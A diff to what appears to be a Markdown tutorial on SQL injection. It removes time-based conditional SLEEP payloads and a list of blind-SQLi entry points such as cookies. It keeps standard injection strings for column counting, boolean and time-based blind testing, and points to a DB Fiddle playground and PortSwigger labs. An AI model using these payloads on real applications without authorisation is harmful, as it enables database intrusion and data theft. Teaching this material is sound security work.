@@ -23,7 +23,6 @@ Used to identify the number of columns.
 ```sql
 ' ORDER BY 1-- -
 ' ORDER BY 2-- -
-...
 ```
 
 Stop when the query breaks — that's your column count.
@@ -59,18 +58,6 @@ Used for brute-forcing data character by character.
 SELECT SUBSTRING(database(),1,1)
 ```
 
-Condition-based delay injection:
-
-```sql
-SELECT IF(SUBSTRING(database(),1,1)='a', SLEEP(3), 'b')
-```
-
-Or for binary search approach:
-
-```sql
-SELECT IF(SUBSTRING(database(),1,1)>'m', SLEEP(3), 'a')
-```
-
 ### 2. Boolean-Based Blind SQLi
 
 Observe true/false logic:
@@ -79,7 +66,6 @@ Observe true/false logic:
 ' AND 1=1-- -
 ' AND 1=2-- -
 ```
-
 Different response pages or content confirms injection.
 
 ### 3. Time-Based Blind SQLi
@@ -89,7 +75,6 @@ Check delay in server response:
 ```sql
 ' OR SLEEP(5)-- -
 ```
-
 If the response is delayed, the application is likely vulnerable.
 
 ### 4. Error-Based SQLi
@@ -103,17 +88,6 @@ For databases configured to display SQL errors:
 This triggers database errors and reveals backend structure.
 
 🔗 [Live SQLi Simulation Playground (DB Fiddle)](https://www.db-fiddle.com/f/nLpyQDMd49iRygnY9H7CB8/5)
-
----
-
-## Where Can Blind SQLi Exist?
-
-* **URL Parameters**
-* **POST Data**
-* **Cookies (e.g., `TrackingId`)**
-* **Session Tokens**
-
-Example from PortSwigger labs demonstrates SQLi in `TrackingId` cookie — a good reminder to test beyond just URLs!
 
 ---
 
